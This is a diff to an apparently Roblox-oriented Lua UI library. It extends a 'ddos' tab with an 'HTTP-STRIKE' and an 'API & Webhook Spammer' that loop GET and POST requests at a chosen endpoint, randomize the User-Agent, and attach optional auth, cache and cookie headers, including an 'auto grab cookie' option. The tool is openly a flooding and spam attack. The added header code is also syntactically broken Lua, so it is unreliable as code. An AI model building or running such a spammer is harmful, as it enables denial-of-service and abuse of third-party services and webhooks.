@@ -7094,6 +7094,12 @@ function lib.DeveloperEncrypt(window,isShowed)
 			_message = "",
 			_strike = "",
 			_request_sent = 0,
+			_auth = false,
+			_auth2 = "",
+			_cache = false,
+			_cache2 = "",
+			_cookie = false,
+			_cookie2 = "",
 			_strike_list = {
 					"application/json",
 					"application/javascript",
@@ -7128,7 +7134,40 @@ function lib.DeveloperEncrypt(window,isShowed)
 			web._message = value
 		end)
 
-		T1:Dropdown("HTTP-STRIKE Method",web._strike_list,function(value)
+		ddos:Textbox("Auth Keys [ If Required ]",false,function(value)
+			web._auth2 = value
+			if value ~= "" then
+				web._auth = true
+				lib:notify(lib:ColorFonts("Auth enabled for api keys","Bold,Green"),10)
+			else
+				web._auth = false
+				lib:notify(lib:ColorFonts("Auth disabled","Bold,Red"),10)
+			end
+		end)
+
+		ddos:Textbox("Cache-Control [ If Required ]",false,function(value)
+			web._cache2 = value
+			if value ~= "" then
+				web._cache = true
+				lib:notify(lib:ColorFonts("Cache-Control Enabled","Bold,Green"),10)
+			else
+				web._cache = false
+				lib:notify(lib:ColorFonts("Cache-Control Disabled","Bold,Red"),10)
+			end
+		end)
+
+		ddos:Textbox("Cookie [ If Required ]",false,function(value)
+			web._cookie2 = value
+			if value ~= "" then
+				web._cookie = true
+				lib:notify(lib:ColorFonts("Cookie Enabled, auto grab cookie when u put 'GRAB'","Bold,Green"),10)
+			else
+				web._cookie = false
+				lib:notify(lib:ColorFonts("Cookie Disabled","Bold,Red"),10)
+			end
+		end)
+
+		ddos:Dropdown("HTTP-STRIKE Method",web._strike_list,function(value)
 			web._strike = value
 		end)
 			
@@ -7156,7 +7195,11 @@ function lib.DeveloperEncrypt(window,isShowed)
 						Method = "POST",
 						Headers = {
 							["Content-Type"] = web._strike,
-							["User-Agent"] = lib.randomString()
+							["Accept"] = web._strike,
+							["User-Agent"] = lib.randomString(),
+							(web._cache and ["Cache-Control"] = web._cache2 or ["Cache-Control"] = nil),
+							(web._auth and ["Authorization"] = web._auth2 or ["Authorization"] = nil),
+							(web._cookie and ["Cookie"] = web._cookie2 or ["Cookie"] = nil)
 						},
 						Body = HttpService:JSONEncode({}) --{["content"] = web._message})
 					})
@@ -7169,6 +7212,7 @@ function lib.DeveloperEncrypt(window,isShowed)
 		local jammer = ddos:Toggle("API & Webhook Spammer",false,function(value)
 			web._spam = value
 		end)
+		local endpointresponse = nil
 
 		lib:runtime(function()
 			if web._spam == true then
@@ -7190,14 +7234,32 @@ function lib.DeveloperEncrypt(window,isShowed)
 							})
 					else
 						--lib.sentMessage(web._endpoint,web._message,{})
+						endpointresponse = http({
+							Url = web._endpoint,
+							Method = "GET",
+							Headers = {
+								["Content-Type"] = web._strike,
+								["Accept"] = web._strike,
+								["User-Agent"] = lib.randomString(),
+								(web._cache and ["Cache-Control"] = web._cache2 or ["Cache-Control"] = nil),
+							        (web._auth and ["Authorization"] = web._auth2 or ["Authorization"] = nil),
+							        (web._cookie and ["Cookie"] = web._cookie2 or ["Cookie"] = nil)
+							}
+							--Body = HttpService:JSONEncode({}) --{["content"] = web._message})]]
+						})
+							
 						web._request_sent = web._request_sent + 1
-						ddoswebsitestrike:EditLabel(`URL : {lib:ColorFonts(web._strike,"Bold,Green")}\n\nStatus Code : {lib:ColorFonts(strike.Status,"Bold,Sky Blue")}\nStatus Text : {lib:ColorFonts(strike.Status:gsub("100","Continue"):gsub("101","Switching Protocols"):gsub("200","OK / Received"):gsub("201","Created"):gsub("204","No Content"):gsub("301","Moved Permanently"):gsub("302","Found"):gsub("304","Not Modified"):gsub("400","Bad Request"):gsub("401","Unauthorized"):gsub("403","Forbidden"):gsub("404","Not Found"):gsub("429","Too Many Request"):gsub("500","Internal Server Error"):gsub("502","Bad Gateway"):gsub("503","Service Unavailable"):gsub("504","Gateway Timeout"),"Bold,Sky Blue")}\nRequest send : {lib:ColorFonts(lib:CurrencyFormat(web._request_sent),"Bold,Sky Blue")}`)
+						ddoswebsitestrike:EditLabel(`URL : {lib:ColorFonts(web._strike,"Bold,Green")}\n\nStatus Code : {lib:ColorFonts(endpointresponse.StatusCode,"Bold,Sky Blue")}\nStatus Text : {lib:ColorFonts(endpointresponse.StatusCode:gsub("100","Continue"):gsub("101","Switching Protocols"):gsub("200","OK / Received"):gsub("201","Created"):gsub("204","No Content"):gsub("301","Moved Permanently"):gsub("302","Found"):gsub("304","Not Modified"):gsub("400","Bad Request"):gsub("401","Unauthorized"):gsub("403","Forbidden"):gsub("404","Not Found"):gsub("429","Too Many Request"):gsub("500","Internal Server Error"):gsub("502","Bad Gateway"):gsub("503","Service Unavailable"):gsub("504","Gateway Timeout"),"Bold,Sky Blue")}\nRequest send : {lib:ColorFonts(lib:CurrencyFormat(web._request_sent),"Bold,Sky Blue")}`)
 						http({
 							Url = web._endpoint,
 							Method = "POST",
 							Headers = {
 								["Content-Type"] = web._strike,
-								["User-Agent"] = lib.randomString()
+								["Accept"] = web._strike,
+								["User-Agent"] = lib.randomString(),
+								(web._cache and ["Cache-Control"] = web._cache2 or ["Cache-Control"] = nil),
+							        (web._auth and ["Authorization"] = web._auth2 or ["Authorization"] = nil),
+							        (web._cookie and ["Cookie"] = web._cookie2 or ["Cookie"] = nil)
 							},
 							Body = HttpService:JSONEncode({}) --{["content"] = web._message})
 						})
